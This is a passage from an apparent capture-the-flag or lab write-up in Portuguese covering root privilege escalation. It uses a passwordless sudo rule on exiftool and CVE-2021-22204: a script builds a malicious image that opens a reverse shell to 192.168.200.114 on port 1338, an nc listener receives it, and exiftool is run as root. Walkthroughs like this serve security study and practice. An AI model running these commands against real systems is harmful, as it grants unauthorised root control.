## Privesc para Root

### Verificação do sudo
```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/exiftool
```

### CVE-2021-22204 — ExifTool RCE como root

O exiftool pode ser executado como root sem senha. A mesma vulnerabilidade usada para obter a shell inicial foi reaproveitada para escalar privilégios.

#### Gerando a imagem maliciosa (na máquina atacante)
```bash
python3 exploitexiftool.py -s 192.168.200.114 1338
```

#### Listener
```bash
nc -lvnp 1338
```

#### Acionando o exiftool como root no servidor
```bash
sudo /usr/local/bin/exiftool image.jpg
```

Shell recebida como **root**.
